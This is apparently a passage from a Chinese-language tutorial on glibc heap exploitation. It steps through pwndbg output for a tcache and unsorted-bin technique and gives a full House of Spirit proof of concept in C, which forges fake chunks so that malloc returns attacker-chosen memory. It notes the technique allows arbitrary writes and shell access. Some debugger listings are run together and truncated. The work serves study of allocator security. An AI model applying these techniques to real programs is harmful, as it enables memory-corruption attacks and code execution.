        return 0;
    }
### 分步分析
#### 1 堆内布局构造
    intptr_t *x[7];
    for(int i=0; i x/50xg 0x555555559f20-0x20
                           ...
    0x555555559f00: 0x0000000000000000  0x0000000000000000
    0x555555559f10: 0x0000000000000000  0x0000000000000000
    0x555555559f20: 0x0000000000000000  0x0000000000000111  tcachebins 
    tcachebins
    0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0
    0x410 [  1]: 0x5555555592a0 ◂— 0x0
#### 3 free victim chunk 并链接到 unsorted bin
    free(a);
    pwndbg> bins 
    tcachebins
    0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0
    0x410 [  1]: 0x5555555592a0 ◂— 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x555555559f20 —▸ 0x7ffff7faebe0 (main_arena+96) ◂— 0x555555559f20
    smallbins
    empty
    largebins
    empty
#### 4 free prev chunk 使它和 victim chunk 合并
    free(prev);
    pwndbg> bins 
    tcachebins
    0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0
    0x410 [  1]: 0x5555555592a0 ◂— 0x0
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x555555559e10 —▸ 0x7ffff7faebe0 (main_arena+96) ◂— 0x555555559e10     tcachebins 
    0x110 [  6]: 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0                 tcachebins 
    0x110 [  7]: 0x555555559f30 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0           x/50xg 0x555555559f20-0x20
    0x555555559f00: 0x0000000000000000  0x0000000000000000
    0x555555559f10: 0x0000000000000000  0x0000000000000000
    0x555555559f20: 0x0000000000000000  0x0000000000000111
    0x555555559f30: 0x00007fffffffdb00  0x0000555555559010 
    #include 
    int main()
    {
        fprintf(stderr, "House of Spirit Poc\n\n");
        fprintf(stderr, "Step1: malloc初始化堆内存\n\n");
        malloc(1);
        fprintf(stderr, "Step2: 覆盖一个堆指针指向伪造的 fastbin 区域\n");
        unsigned long long *a;
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
        fprintf(stderr, "\t这片区域 (长度为: %lu) 包含两个 fake chunk.\n", sizeof(fake_chunks));
        fprintf(stderr, "\t第一个fake chunk位于 %p\n", &fake_chunks[1]);
        fprintf(stderr, "\t第二个fake chunk位于 %p\n", &fake_chunks[9]);
        fake_chunks[1] = 0x40; 
        fprintf(stderr, "\t第二个fake chunk 的size必须大于 2*SIZE_SZ (x64上 > 16) && 小于 av->system_mem，用于绕过nextsize检查\n");
        fake_chunks[9] = 0x1234; // nextsize
        fprintf(stderr, "\t覆盖堆指针指向第一个fake chunk %p \n\n", &fake_chunks[1]);
        a = &fake_chunks[2];
        fprintf(stderr, "Step3: free被覆盖堆指针的堆\n\n");
        free(a);
        fprintf(stderr, "Step4: malloc申请到fake chunk\n");
        fprintf(stderr, "\t再次malloc将会在 %p 返回fake chunk %p \n", &fake_chunks[1], &fake_chunks[2]);
        fprintf(stderr, "\tmalloc(0x30): %p\n", malloc(0x30));
    }
### 分步分析
#### 1 malloc初始化堆内存
    malloc(1);
    pwndbg> heap
    0x602000 FASTBIN {
      prev_size = 0, 
      size = 33, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x20fe1
    }
    0x602020 PREV_INUSE {
      prev_size = 0, 
      size = 135137, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
    pwndbg> x/10xg 0x602020-0x20
    0x602000:   0x0000000000000000  0x0000000000000021  x/16xg 0x7fffffffdca8
    0x7fffffffdca8: 0x0000000000000040  0x00007ffff7ffe168  fastbins 
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x7fffffffdca0 ◂— 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
#### 4 malloc申请到该区域
    malloc(0x30);
### tcache
glibc2.26之后加入了tcache机制,tcache在提高内存管理效率的同时，安全性有所下降
tcache house of
spirit只需伪造一个size区域，然后将伪造的fakechunk释放，再次malloc相应大小就可以得到fake_chunk。
### 利用思路
house_of_spirit可以进行任意地址写，可以改写为system直接getshell，也可以进一步利用。
## 总结
House of系列堆漏洞的分析到这里就结束了，通过gdb单步调试，对堆结构等熟悉了很多。
在glibc版本不断升级的同时，堆内的一些保护不断完善，但与此同时，像tcache这样的新增技术也暴露出新的漏洞，在后期的漏洞挖掘中，对这些新技术的漏洞挖掘应该更加重视。